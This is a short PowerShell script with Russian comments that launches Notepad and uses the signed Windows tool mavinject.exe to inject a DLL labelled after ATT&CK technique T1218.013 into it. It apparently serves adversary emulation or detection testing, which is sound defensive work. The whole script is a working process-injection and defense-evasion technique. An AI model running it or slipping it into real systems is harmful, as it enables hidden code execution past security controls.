$dllPath = ".\T1218.013_payload.dll"

# Запуск блокнота и получение процесса
$process = Start-Process -FilePath "notepad.exe" -PassThru
$targetPid = $process.Id

# Проверка существования DLL

if (-not (Test-Path $dllPath)) {
    Write-Host "Error: DLL file $dllPath not found."
    exit 1
}

# Выполнение mavinject для инжекта DLL в процесс
$cmd = "C:\Windows\System32\mavinject.exe $targetPid /INJECTRUNNING $dllPath"
Write-Host "Executing command: $cmd"

try {
    Invoke-Expression $cmd
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Error: Injection failed with exit code $LASTEXITCODE."
        exit $LASTEXITCODE
    } else {
        Write-Host "DLL successfully injected into Notepad process (PID: $targetPid)."
    }

} catch {
    Write-Host "Error: An exception occurred during injection."
    Write-Host $_.Exception.Message
    exit 1

}
